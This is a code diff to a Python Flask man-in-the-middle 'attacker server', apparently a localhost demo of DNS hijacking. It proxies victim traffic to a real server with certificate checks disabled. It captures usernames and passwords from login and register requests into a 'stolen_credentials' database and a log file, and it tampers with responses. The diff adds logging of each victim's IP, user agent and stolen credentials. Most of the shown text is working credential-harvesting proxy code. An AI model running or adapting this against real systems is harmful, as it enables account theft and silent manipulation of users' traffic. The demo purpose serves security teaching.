@@ -3,15 +3,17 @@
 
 DNS 劫持后，受害者流量被导向此服务器。
 它做了三件事：
-  1. 窃取登录凭证（明文记录到 attacker_db）
+  1. 窃取登录凭证（明文记录到 attacker_db + traffic.log）
   2. 将请求转发给真实 Flask 服务器
   3. 篡改响应内容（展示中间人篡改风险）
+
+实时监控: Get-Content attacker_traffic.log -Wait
 """
 import os
+import sys
 import sqlite3
 import threading
-import time
-import json
+from datetime import datetime
 
 import requests
 from flask import Flask, request, Response, g
@@ -26,7 +28,21 @@ REAL_SERVER = 'https://127.0.0.1:443'
 # 真 nginx 也是自签名证书，需要跳过验证
 VERIFY_SSL = False
 
-ATTACKER_DB = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'attacker_db.sqlite')
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+ATTACKER_DB = os.path.join(BASE_DIR, 'attacker_db.sqlite')
+TRAFFIC_LOG = os.path.join(BASE_DIR, 'attacker_traffic.log')
+
+_log_lock = threading.Lock()
+
+
+def log_event(msg):
+    """写入流量日志文件 + 终端输出"""
+    now = datetime.now().strftime('%H:%M:%S')
+    line = f'[{now}] {msg}'
+    with _log_lock:
+        with open(TRAFFIC_LOG, 'a', encoding='utf-8') as f:
+            f.write(line + '\n')
+        print(line, flush=True)
 
 
 def get_attacker_db():
@@ -100,12 +116,16 @@ def mitm_proxy(path):
         target_url += f'?{request.query_string.decode()}'
 
     headers = dict(request.headers)
-    # 移除 hop-by-hop 头
     for key in ['Host', 'Connection', 'Transfer-Encoding', 'Content-Length']:
         headers.pop(key, None)
 
     method = request.method
     data = request.get_data()
+    victim_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    ua_short = (request.user_agent.string or '')[:60] if request.user_agent else ''
+
+    # 记录每个请求
+    log_event(f'{method} /{path}  <- {victim_ip}  UA={ua_short}')
 
     # ── ① 窃取登录/注册凭证 ─────────────────────────────
     if method == 'POST' and ('login' in path or 'register' in path):
@@ -114,37 +134,35 @@ def mitm_proxy(path):
         password = form_data.get('password', '')
 
         if username or password:
-            victim_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-            victim_ua = request.user_agent.string if request.user_agent else ''
-
             db = get_attacker_db()
             db.execute(
                 'INSERT INTO stolen_credentials (username, password, victim_ip, victim_ua) VALUES (?, ?, ?, ?)',
-                (username, password, victim_ip, victim_ua)
+                (username, password, victim_ip, request.user_agent.string if request.user_agent else '')
             )
             db.commit()
 
-            # 实时打印到终端
-            print(f'\n*** [凭证窃取] 用户名: {username} | 密码: {password}')
-            print(f'    IP: {victim_ip} | UA: {victim_ua[:80]}')
+            log_event(f'!!! STOLEN: username="{username}" password="{password}"')
 
     # ── ② 转发给真实服务器 ─────────────────────────────
     try:
         if method == 'GET':
             resp = requests.get(target_url, headers=headers, allow_redirects=False,
-                                    timeout=10, verify=VERIFY_SSL)
+                                timeout=10, verify=VERIFY_SSL)
         elif method == 'POST':
             resp = requests.post(target_url, data=data, headers=headers, allow_redirects=False,
-                                     timeout=10, verify=VERIFY_SSL)
+                                 timeout=10, verify=VERIFY_SSL)
         else:
             resp = requests.request(method, target_url, data=data, headers=headers,
                                     allow_redirects=False, timeout=10, verify=VERIFY_SSL)
     except requests.RequestException as e:
-        return f'[攻击者服务器错误] 无法连接真实服务器: {e}', 502
+        log_event(f'ERROR: real server unreachable: {e}')
+        return f'[Attacker Error] Cannot reach real server: {e}', 502
 
     # ── ③ 篡改响应 ─────────────────────────────────────
     content_type = resp.headers.get('Content-Type', '')
     tampered_body = tamper_response(resp.content, content_type)
+    if tampered_body != resp.content:
+        log_event(f'TAMPERED: {method} /{path} response ({len(tampered_body)} bytes)')
 
     excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
     response_headers = [(k, v) for k, v in resp.headers.items()
@@ -202,10 +220,12 @@ def attacker_log():
 # ── 启动 ──────────────────────────────────────────────────────
 
 if __name__ == '__main__':
-    print('*** 攻击者服务器启动...')
-    print(f'    监听: 127.0.0.1:5001')
-    print(f'    转发目标: {REAL_SERVER}')
-    print(f'    攻击者日志: http://127.0.0.1:5001/attacker-log')
-    print(f'    窃取的凭证会实时打印在下方:')
-    print('-' * 55)
+    print('=' * 55)
+    print('  Attacker MITM Server')
+    print(f'  Listen: 127.0.0.1:5001')
+    print(f'  Forward to: {REAL_SERVER}')
+    print(f'  Traffic log: {TRAFFIC_LOG}')
+    print(f'  Captured credentials: http://127.0.0.1:5001/attacker-log')
+    print(f'  Real-time monitor: Get-Content {TRAFFIC_LOG} -Wait')
+    print('=' * 55)
     app.run(debug=False, host='127.0.0.1', port=5001)
